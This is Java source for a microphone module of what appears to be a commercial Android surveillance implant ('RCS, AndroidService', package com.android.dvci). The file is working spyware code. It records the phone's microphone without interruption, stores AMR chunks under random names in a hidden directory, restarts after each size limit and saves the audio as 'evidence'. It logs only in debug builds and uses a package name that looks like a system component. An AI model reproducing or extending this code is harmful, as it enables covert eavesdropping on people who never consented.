/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : MicAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.module;

import android.media.MediaRecorder;

import com.android.dvci.auto.Cfg;
import com.android.dvci.file.AutoFile;
import com.android.dvci.file.Path;
import com.android.dvci.util.Check;
import com.android.dvci.util.DateTime;
import com.android.dvci.util.Utils;

import java.io.FileInputStream;
import java.io.IOException;

/**
 * The Class MicAgent. 8000KHz, 16bit
 *
 * @author zeno
 * @ref: http://developer.android.com/reference/android/media/MediaRecorder.html
 */
public class ModuleMicL extends ModuleMic {

	private static final String TAG = "ModuleMicL"; //$NON-NLS-1$
	private static final long MAX_FILE_SIZE = 1024 * 50;//50KB

	private AutoFile out_file;

	public ModuleMicL() {
		super();
	}

	void specificStop() {
		stopRecorder();
		recorder = null;
	}

	void specificGo(int numFailures) {

		if (numFailures > 10) {
			stopRecorder();
			recorder = null;
			if (Cfg.DEBUG) {
				Check.log(TAG + "numFailures: " + numFailures);//$NON-NLS-1$
			}
		}
	}

	byte[] unfinished = null;

	protected byte[] getAvailable() {
		byte[] ret = null;

		if (out_file != null && out_file.exists() && out_file.getSize() != 0) {
			FileInputStream fin = null;
			try {
				// create FileInputStream object
				fin = new FileInputStream(out_file.getFile());
				ret = new byte[(int) out_file.getSize()];
				// Reads up to certain bytes of data from this input stream into an array of bytes.
				fin.read(ret);
			} catch (IOException ioe) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "Exception while reading file " + ioe);
				}
			} finally {
				// close the streams using close method
				try {
					if (fin != null) {
						fin.close();
					}
				} catch (IOException ioe) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "Error while closing stream: " + ioe);
					}
				}
			}
		}
		return ret;
	}

	/**
	 * Start recorder.
	 *
	 * @throws IllegalStateException the illegal state exception
	 * @throws java.io.IOException   Signals that an I/O exception has occurred.
	 */
	synchronized void specificStart() throws IllegalStateException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (specificStart)");//$NON-NLS-1$
		}
		numFailures = 0;
		unfinished = null;

		if (recorder == null) {
			final DateTime dateTime = new DateTime();
			fId = dateTime.getFiledate();
			if (Cfg.DEBUG) {
				Check.log(TAG + " (specificStart) new recorder ");//$NON-NLS-1$
			}
			recorder = new MediaRecorder();
		}
		recorder.setOnErrorListener(this);
		recorder.setOnInfoListener(this);
		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);

		createSockets();
		if (out_file != null) {
			recorder.setOutputFile(out_file.getFilename());
		} else {
			recorder.reset();
			recorder.release();
			recorder = null;
		}
		try {
			recorder.setMaxFileSize(MAX_FILE_SIZE);
			recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
			recorder.prepare();
			recorder.start(); // Recording is now started
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (specificStart) another apps may be blocking recording: " + e);//$NON-NLS-1$
			}
			if (recorder != null) {
				recorder.reset();
				recorder.release();
				recorder = null;
			}
			if (out_file != null) {
				deleteSockets();
			}
		}
	}

	private void createSockets() {
		if (out_file == null) {
			out_file = new AutoFile(Path.hidden(), Utils.getRandom() + ".a");
			if (Cfg.DEBUG) {
				Check.log(TAG + " (createSocket) new file: " + out_file.getFile());//$NON-NLS-1$
			}
		}
	}

	private void deleteSockets() {
		if (out_file != null && out_file.exists()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (deleteSockets) delete file: " + out_file.getFile());//$NON-NLS-1$
			}
			out_file.delete();
		}
		out_file = null;
	}

	// http://sipdroid.googlecode.com/svn/trunk/src/org/sipdroid/sipua/ui/VideoCamera.java

	/**
	 * Stop recorder.
	 */
	synchronized void stopRecorder() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stopRecorder)");//$NON-NLS-1$
		}
		if (recorder != null) {
			recorder.setOnErrorListener(null);
			recorder.setOnInfoListener(null);

			try {
				recorder.stop();
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(ex);
				}
			}
			if (out_file == null || !out_file.exists()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveRecorderEvidence) Error: out_file not available");

				}
				numFailures += 1;
			} else {
				saveRecorderEvidence();
			}
		}
	}

	public void onInfo(MediaRecorder mr, int what, int extra) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onInfo): " + what);//$NON-NLS-1$
		}
		/*
		After recording reaches the specified filesize, a notification will be sent to the MediaRecorder.OnInfoListener with a "what"
		code of MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED
		and recording will be stopped.
		Stopping happens asynchronously, there is no guarantee that the recorder will
		have stopped by the time the listener is notified.
		*/
		if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onInfo): max Size reached, saving file");//$NON-NLS-1$
			}
			stopRecorder();
			deleteSockets();
			try {
				specificStart();
			} catch (Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onInfo): exception restarting Mic");//$NON-NLS-1$
				}
			}
		}
	}

	public void onError(MediaRecorder mr, int what, int extra) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onError) Error: " + what);//$NON-NLS-1$
		}
		suspend();
	}

}
